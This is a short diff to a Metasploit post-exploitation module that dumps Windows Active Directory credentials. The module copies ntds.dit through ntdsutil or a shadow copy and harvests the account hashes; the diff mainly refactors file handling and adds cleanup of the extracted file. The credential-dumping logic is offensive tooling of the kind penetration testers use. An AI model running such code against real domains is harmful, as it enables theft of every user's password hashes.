@@ -11,9 +11,9 @@ require 'metasploit/framework/ntds/parser'
 class Metasploit3 < Msf::Post
   include Msf::Post::Windows::Registry
   include Msf::Auxiliary::Report
-  include Msf::Post::Windows::Services
   include Msf::Post::Windows::Priv
   include Msf::Post::Windows::ShadowCopy
+  include Msf::Post::File
 
   def initialize(info={})
     super(update_info(info,
@@ -47,6 +47,7 @@ class Metasploit3 < Msf::Post
             report_hash(hash_string.downcase,ad_account.name, realm)
           end
         end
+        rm_f(ntds_file)
       end
     end
   end
@@ -76,7 +77,6 @@ class Metasploit3 < Msf::Post
   end
 
   def ntdsutil_method
-    get_env
     tmp_path = "#{expand_path("%TEMP%")}\\#{Rex::Text.rand_text_alpha((rand(8)+6))}"
     command_arguments = "\"activate instance ntds\" \"ifm\" \"Create Full #{tmp_path}\" quit quit"
     result = cmd_exec("ntdsutil.exe", command_arguments)
@@ -149,7 +149,7 @@ class Metasploit3 < Msf::Post
     sc_path = "#{sc_details['DeviceObject']}\\windows\\ntds\\ntds.dit"
     target_path = "#{expand_path("%TEMP%")}\\#{Rex::Text.rand_text_alpha((rand(8)+6))}"
     print_status "Moving ntds.dit to #{target_path}"
-    client.fs.file.mv(sc_path, target_path)
+    move_file(sc_path, target_path)
     target_path
   end
 
